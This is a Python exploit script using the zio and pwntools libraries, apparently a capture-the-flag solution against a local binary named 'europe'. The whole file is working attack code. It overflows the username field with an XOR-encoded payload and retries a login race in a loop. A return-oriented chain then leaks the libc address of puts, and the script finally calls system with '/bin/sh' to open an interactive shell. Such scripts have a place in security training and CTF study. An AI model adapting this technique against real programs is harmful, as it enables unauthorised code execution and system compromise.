from zio import *
from pwn import *
import time
import random

context(arch = "i386", os = 'linux')
target = "./europe"
def get_io(target):
	ELF(target)
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn_by_rop(io):

	puts_got = 0x0804a14c
	puts_plt = 0x080487F0
	fgets_plt = 0x8048780

	repeat_addr = 0x08048DA8

	size = 0x5
	p_rbp_ret = p_ret = 0x08049073
	ppp_ret = 0x080490d6

	username_addr = 0x0804A1C0
	password_addr = 0x0804B560

	binsh = username_addr + 0x50

	leave_ret = 0x08049056

	shellcode =  'a' * 0x50 + "/bin/sh;"

	username = (0x5e0 - len(shellcode)) * 'a'
	username += '\xe3'
	username += 'a' * 3 #avoid overwrite var of i(modify the last byte)
	username += 'a' * (0xC)

	username += l32(puts_plt) + l32(p_ret) + l32(puts_got)
	username += l32(p_rbp_ret) + l32(username_addr + len(shellcode + username) + 4 + 4 + 4) #set ebp
	username += l32(leave_ret)  #set esp


	buff = [chr(ord(c) ^ 0x20) for c in username]
	username = "".join(buff)

	username += l32(password_addr) #new ebp
	username += l32(repeat_addr) #do it again

	username = shellcode + username

	password = 'a'

	while True:
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write("guest\n")
		io.read_until("Password: ")
		io.write("guest\n")
		io.read_until(" > ")
		io.write("1\n")
		io.read_until("Username: ")
		io.write(username + "\n")
		io.read_until("Password: ")
		time.sleep(1)
		#io.write("admin\n")
		io.write(password + "\n")
		io.read_until(" > ")

		#time.sleep(random.random())
		#raw_input(":")
		io.write("3\n")
		#io.interact()
		data = io.read_until("?")
		if data.find("You're not logged in") == -1:
			break

	io.read_until(" > ")
	#raw_input(":")
	io.write("4\n")
	data = io.read(4)
	print [c for c in data]
	puts_real = l32(data)
	print "puts addr:", hex(puts_real)
	libc_addr = puts_real - 0x000656A0
	system_addr = 0x0003E800 + libc_addr
	binsh_addr = 0x0015F9E4 + libc_addr
	print "system addr:", hex(system_addr)

	#raw_input(":")
	io.read_until(" > ")
	io.write("1\n")
	io.read_until("Username: ")
	io.write("a\n")
	io.read_until("Password: ")
	password = 'a' * 0x4
	password += l32(system_addr)
	password += l32(p_ret)
	#password += l32(binsh)
	password += l32(binsh_addr)
	io.write(password + "\n")

	io.read_until(" > ")
	io.write("4\n")

	io.interact()

io = get_io(target)
pwn_by_rop(io)